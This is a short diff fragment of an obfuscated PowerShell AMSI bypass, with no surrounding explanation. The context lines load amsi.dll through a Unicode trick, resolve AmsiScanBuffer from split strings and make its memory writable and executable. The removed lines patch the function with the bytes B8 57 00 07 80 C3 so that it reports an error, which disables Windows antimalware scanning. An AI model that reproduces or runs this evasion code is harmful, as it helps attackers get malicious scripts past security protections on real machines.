@@ -25,11 +25,3 @@ $wzqprfk = [afrcv]::LoadLibrary("$(('àmsî.'+'dll').NoRMAlize([chaR]([byte]0x46
 $npmjpz = [afrcv]::GetProcAddress($wzqprfk, "A"+"m"+"si" + "S"+"c"+"an" + "Bu"+"f"+"f"+"er")
 $p = 0
 [afrcv]::VirtualProtect($npmjpz, [uint32]5, 0x40, [ref]$p)
-$vxck = "0xB8"
-$uixn = "0x57"
-$bxny = "0x00"
-$rxqr = "0x07"
-$yzex = "0x80"
-$gbrq = "0xC3"
-$acyyr = [Byte[]] ($vxck,$uixn,$bxny,$rxqr,+$yzex,+$gbrq)
-$7amada::Copy($acyyr, 0, $npmjpz, 6)
